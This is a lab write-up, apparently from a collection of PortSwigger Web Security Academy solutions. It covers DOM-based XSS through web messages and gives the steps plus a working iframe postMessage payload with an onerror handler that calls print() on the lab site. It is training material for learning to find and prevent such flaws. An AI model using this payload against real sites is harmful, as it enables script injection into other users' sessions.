## DOM XSS using web messages

**Category:** xss_dom
**Difficulty:** Unknown

### Description
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes theprint()function to be called.

### Solution Steps
1. Notice that the home page contains an addEventListener() call that listens for a web message.
2. Go to the exploit server and add the following iframe to the body. Remember to add your own lab ID: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
3. Store the exploit and deliver it to the victim.

### Key Payloads
- `print()`
- `addEventListener()`
- `iframe`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
- `postMessage()`
- `onerror`

### Indicators of Success
- DOM sink receives tainted source data
- JavaScript executes via DOM manipulation
- URL fragment or hash value exploited
- postMessage handler vulnerable
- Client-side code processes attacker input
---
*Source: PortSwigger Web Security Academy*
